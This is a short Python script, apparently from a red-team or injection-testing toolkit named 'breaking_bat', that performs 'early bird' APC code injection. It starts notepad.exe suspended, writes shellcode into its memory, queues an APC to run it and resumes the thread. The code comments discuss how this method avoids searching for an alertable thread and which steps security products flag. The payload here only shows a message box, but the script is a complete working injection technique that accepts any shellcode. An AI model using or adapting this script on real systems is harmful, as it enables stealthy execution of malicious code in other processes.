# NOTE:
# The main advantage of running a suspended process is executing shellcode via APC at the process initialization stage
# so we don't need to search an alertable thread, APC will be executed immediately
# On the other hand, running a suspended process and resuming threads are red flags for security solutions
# but without suspension it will be a regular APC injection (but into a newly started process)
# TODO: maybe add a strategy selection option and/or merge this script with the regular APC injection script

import breaking_bat as bb
from breaking_bat import RemoteProcessMemoryMethod

if __name__ == "__main__":

    print("Script: Inject via queue user APC (early bird)")
    print()

    bb.init_sysapi()
    bb.set_default_options(
        memory_method=RemoteProcessMemoryMethod.AllocateInAddr
    )

    shellcode = bb.shellcode_get_messageboxw();

    bb.process_create_user(original_image="C:\\Windows\\System32\\notepad.exe", suspended=True)

    mem_ctx = bb.process_init_memory(pid=0)
    bb.memory_set_size(ctx=mem_ctx, size=len(shellcode))
    bb.process_create_memory(ctx=mem_ctx)
    bb.process_write_memory(ctx=mem_ctx, data=shellcode)
    bb.process_thread_queue_user_apc(bb.memory_get_remote_address(ctx=mem_ctx))
    bb.process_thread_resume()

    bb.script_success()
